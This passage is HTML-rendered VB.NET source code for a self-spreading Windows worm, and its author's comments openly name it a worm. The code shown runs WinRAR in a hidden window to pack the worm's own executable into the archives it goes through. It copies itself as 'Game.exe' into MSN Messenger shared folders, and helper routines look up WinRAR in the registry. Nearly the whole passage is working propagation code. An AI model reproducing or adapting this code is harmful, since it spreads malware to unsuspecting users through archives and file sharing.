                </span><span class="sc7">ShrtPath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetShortFileName</span><span class="sc6">(</span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0">
                </span><span class="sc7">compile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RarPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" a "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">ShrtPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">WormFile</span><span class="sc0">
                </span><span class="sc7">Shell</span><span class="sc6">(</span><span class="sc7">compile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">AppWinStyle.Hide</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
        </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
    </span><span class="sc1">'''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'here is the MSN shares worm sub  '
</span><span class="sc0">    </span><span class="sc1">'''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">MSN_Share_drop</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WormModule</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">System.Reflection.Module</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">[Assembly]</span><span class="sc6">.</span><span class="sc7">GetExecutingAssembly</span><span class="sc6">().</span><span class="sc7">GetModules</span><span class="sc6">()(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WormFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">WormModule.FullyQualifiedName</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">FolPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WormPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Documents and Settings\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Environ</span><span class="sc6">(</span><span class="sc4">"USERNAME"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Local Settings\Application Data\Microsoft\Messenger\"</span><span class="sc0">
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">FolPath</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileAttribute.Directory</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Int32</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Int32</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">shares</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
            </span><span class="sc7">shares</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">System.IO.Directory.GetDirectories</span><span class="sc6">(</span><span class="sc7">FolPath</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">shares.GetUpperBound</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">shares</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">FileAttribute.Directory</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
                    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">File.Exists</span><span class="sc6">(</span><span class="sc7">shares</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Game.exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
                        </span><span class="sc7">File.Copy</span><span class="sc6">(</span><span class="sc7">WormFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">shares</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Game.exe"</span><span class="sc6">)</span><span class="sc0">
                    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
                </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
            </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
    </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'the worm needs to know if and where WinRar is right?  '
</span><span class="sc0">    </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetRarPath</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">myReg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">RegistryKey</span><span class="sc0">
        </span><span class="sc7">myReg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Registry.LocalMachine.OpenSubKey</span><span class="sc6">(</span><span class="sc4">"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc7">myReg</span><span class="sc0"> </span><span class="sc3">Is</span><span class="sc0"> </span><span class="sc3">Nothing</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc7">GetRarPath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">CStr</span><span class="sc6">(</span><span class="sc7">myReg.GetValue</span><span class="sc6">(</span><span class="sc4">"Path"</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\WinRar.exe"</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'Long path wont work with WinRar.exe because of the spaces so this function deals with it '
</span><span class="sc0">    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetShortFileName</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">LongPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ShortPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">StringBuilder</span><span class="sc6">(</span><span class="sc7">MAX_PATH</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">BufferSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetShortPathName</span><span class="sc6">(</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">LongPath</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">ShortPath</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">ShortPath.Capacity</span><span class="sc6">)</span><span class="sc0">

        </span><span class="sc3">Return</span><span class="sc0"> </span><span class="sc7">ShortPath.ToString</span><span class="sc6">()</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
    </span><span class="sc1">'''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'get current directory  '
</span><span class="sc0">    </span><span class="sc1">'''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WorkingFolder</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">arg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">dir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Pos</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
        </span><span class="sc7">Pos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStrRev</span><span class="sc6">(</span><span class="sc7">arg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">dir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">arg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc7">Pos</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc7">WorkingFolder</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">dir</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Class</span><span class="sc0">

</span><span class="sc1">'Ok its messy! But I'm proud of it.</span></div></body>
</html>
